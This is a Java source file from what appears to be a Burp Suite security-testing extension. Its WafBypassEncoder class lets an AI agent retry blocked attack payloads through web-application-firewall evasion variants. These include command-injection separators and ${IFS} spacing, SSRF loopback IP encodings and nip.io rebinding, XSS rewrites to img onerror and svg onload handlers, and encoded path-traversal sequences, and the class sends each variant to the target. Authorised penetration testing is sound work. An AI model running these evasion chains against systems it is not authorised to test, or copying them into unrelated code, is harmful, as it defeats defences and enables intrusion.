package com.flechazo.apisentinel.detection;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.flechazo.apisentinel.logging.LeveledLogger;
import com.flechazo.apisentinel.model.ApiEntry;

import java.util.ArrayList;
import java.util.List;
import java.util.Locale;

/**
 * Agent-mode WAF bypass retry: when a payload was blocked, tries an ordered
 * chain of encoding/rewrite strategies (reusing {@link WafEncoder}'s
 * encoders) until one passes {@link WafDetector} or the chain (max 4
 * requests) is exhausted. Pipeline mode has its own automatic variant retry;
 * this class is the AI-invoked counterpart.
 */
public class WafBypassEncoder {

    /** Max probe requests per bypass attempt. */
    public static final int MAX_ATTEMPTS = 4;

    /** Result of a bypass attempt chain. */
    public record BypassResult(
            boolean bypassed,
            String strategy,        // technique that worked ("" on failure)
            String bypassPayload,   // the payload that passed ("" on failure)
            String detail,          // one-liner for LLM/report
            String sentRequest,
            String receivedResponse,
            int statusCode
    ) {}

    private final MontoyaApi api;
    private final LeveledLogger logger;
    private final WafDetector wafDetector;

    public WafBypassEncoder(MontoyaApi api, LeveledLogger logger, boolean wafDetectionEnabled) {
        this.api = api;
        this.logger = logger;
        this.wafDetector = wafDetectionEnabled ? new WafDetector(logger) : null;
    }

    /**
     * Try bypass strategies for a blocked payload.
     *
     * @param vulnType        sql_injection|command_injection|ssrf|xss|path_traversal
     * @param originalPayload the payload that was blocked
     * @param paramName       parameter carrying the payload (may be empty when
     *                        the payload appears verbatim in the raw request)
     */
    public BypassResult attemptBypass(ApiEntry entry, String vulnType, String originalPayload,
                                      String paramName, String paramLocation) {
        if (wafDetector == null) {
            return new BypassResult(false, "", "", "WAF 识别未启用，无法判定绕过", "", "", 0);
        }
        String raw = entry.getLastRawRequest();
        if (raw == null || raw.isEmpty() || originalPayload == null || originalPayload.isEmpty()) {
            return new BypassResult(false, "", "", "缺少捕获请求或原始 payload", "", "", 0);
        }

        List<WafEncoder.Variant> variants = strategiesFor(vulnType, originalPayload);
        int tried = 0;
        for (WafEncoder.Variant v : variants) {
            if (tried >= MAX_ATTEMPTS) break;

            String mutated;
            if (raw.contains(originalPayload)) {
                mutated = raw.replace(originalPayload, v.payload());
            } else if (paramName != null && !paramName.isEmpty()) {
                mutated = BlindParamMutator.mutate(raw, paramName, paramLocation, v.payload());
            } else {
                continue;
            }
            if (mutated == null) continue;
            tried++;

            Probe p = send(entry, mutated);
            if (p == null) continue;
            WafDetector.WafDetectionResult waf = wafDetector.detect(p.rawResponse, p.status, p.elapsed);
            if (!waf.isBlocked()) {
                if (logger != null) {
                    logger.info("[WafBypass] %s 策略 '%s' 绕过成功 (status=%d)",
                            entry.getApiPath(), v.technique(), p.status);
                }
                return new BypassResult(true, v.technique(), v.payload(),
                        "'" + v.technique() + "' 变体绕过 WAF（响应 " + p.status
                      + "，未再判定为拦截页），可用此 payload 继续验证",
                        mutated, p.rawResponse, p.status);
            }
        }
        return new BypassResult(false, "", "",
                tried + " 种绕过策略均被 WAF 拦截，建议标注 WAF 防护有效", "", "", 0);
    }

    // ======================== Strategy chains (pure) ========================

    /** Ordered bypass variants for a vuln class (capped at MAX_ATTEMPTS). */
    public static List<WafEncoder.Variant> strategiesFor(String vulnType, String payload) {
        List<WafEncoder.Variant> all = new ArrayList<>();
        String t = vulnType == null ? "" : vulnType.toLowerCase(Locale.ROOT);
        if (t.contains("sql")) {
            all.addAll(WafEncoder.caseMix(payload));
            all.addAll(WafEncoder.sqlCommentInject(payload));
            all.addAll(WafEncoder.urlEncode(payload, 1));
            all.addAll(WafEncoder.operatorSubstitute(payload));
        } else if (t.contains("command") || t.contains("cmd") || t.contains("rce")) {
            all.addAll(cmdSeparatorVariants(payload));
        } else if (t.contains("ssrf")) {
            all.addAll(ssrfIpVariants(payload));
        } else if (t.contains("xss")) {
            all.addAll(xssTagVariants(payload));
            all.addAll(WafEncoder.caseMix(payload));
            all.addAll(WafEncoder.base64WrapXss(payload));
        } else if (t.contains("path") || t.contains("traversal") || t.contains("lfi")) {
            all.addAll(pathTraversalVariants(payload));
        } else {
            all.addAll(WafEncoder.urlEncode(payload, 2));
            all.addAll(WafEncoder.caseMix(payload));
        }
        return all.size() > MAX_ATTEMPTS ? all.subList(0, MAX_ATTEMPTS) : all;
    }

    /** Command-injection separator/spacer substitutions. */
    public static List<WafEncoder.Variant> cmdSeparatorVariants(String payload) {
        List<WafEncoder.Variant> out = new ArrayList<>();
        String[][] subs = {
                {"sep-pipe", payload.replace(";", "|")},
                {"sep-double-pipe", payload.replace(";", "||")},
                {"sep-and", payload.replace(";", "&&")},
                {"sep-newline", payload.replace(";", "%0a")},
                {"space-ifs", payload.replace(" ", "${IFS}")},
                {"space-ifs9", payload.replace(" ", "$IFS$9")},
        };
        for (String[] s : subs) {
            if (!s[1].equals(payload)) out.add(new WafEncoder.Variant(s[0], s[1]));
        }
        return out;
    }

    /** SSRF loopback encodings (decimal/hex/IPv6/DNS). */
    public static List<WafEncoder.Variant> ssrfIpVariants(String payload) {
        List<WafEncoder.Variant> out = new ArrayList<>();
        String[][] subs = {
                {"ip-decimal", payload.replace("127.0.0.1", "2130706433")},
                {"ip-hex", payload.replace("127.0.0.1", "0x7f.0.0.1")},
                {"ip-ipv6", payload.replace("127.0.0.1", "[::1]")},
                {"ip-short", payload.replace("127.0.0.1", "127.1")},
                {"ip-dns-rebinding", payload.replace("127.0.0.1", "127.0.0.1.nip.io")},
        };
        for (String[] s : subs) {
            if (!s[1].equals(payload)) out.add(new WafEncoder.Variant(s[0], s[1]));
        }
        return out;
    }

    /** XSS tag rewrites for when &lt;script&gt; is blocked. */
    public static List<WafEncoder.Variant> xssTagVariants(String payload) {
        List<WafEncoder.Variant> out = new ArrayList<>();
        if (payload.toLowerCase().contains("<script")) {
            out.add(new WafEncoder.Variant("tag-img-onerror",
                    payload.replaceAll("(?i)<script[^>]*>.*?</script>",
                            "<img src=x onerror=alert(1)>")));
            out.add(new WafEncoder.Variant("tag-svg-onload",
                    payload.replaceAll("(?i)<script[^>]*>.*?</script>",
                            "<svg onload=alert(1)>")));
        }
        return out;
    }

    /** Path-traversal encoding variants. */
    public static List<WafEncoder.Variant> pathTraversalVariants(String payload) {
        List<WafEncoder.Variant> out = new ArrayList<>();
        String[][] subs = {
                {"enc-single", payload.replace("../", "%2e%2e%2f")},
                {"enc-double", payload.replace("../", "%252e%252e%252f")},
                {"dotslash-dotdot", payload.replace("../", "....//")},
                {"enc-unicode", payload.replace("../", "..%c0%af")},
                {"backslash", payload.replace("../", "..\\")},
        };
        for (String[] s : subs) {
            if (!s[1].equals(payload)) out.add(new WafEncoder.Variant(s[0], s[1]));
        }
        return out;
    }

    // ======================== plumbing ========================

    private static final class Probe {
        final String rawResponse;
        final int status;
        final long elapsed;

        Probe(String rawResponse, int status, long elapsed) {
            this.rawResponse = rawResponse;
            this.status = status;
            this.elapsed = elapsed;
        }
    }

    private Probe send(ApiEntry entry, String rawRequest) {
        try {
            long start = System.currentTimeMillis();
            HttpRequestResponse rr = api.http().sendRequest(HttpRequest.httpRequest(
                    ActiveProbeExecutor.resolveService(entry), rawRequest));
            long elapsed = System.currentTimeMillis() - start;
            int status = rr.response() != null ? rr.response().statusCode() : 0;
            String rawResp = rr.response() != null ? rr.response().toString() : "";
            return new Probe(rawResp, status, elapsed);
        } catch (Exception e) {
            if (logger != null) logger.warn("[WafBypass] 请求失败: %s", e.getMessage());
            return null;
        }
    }
}
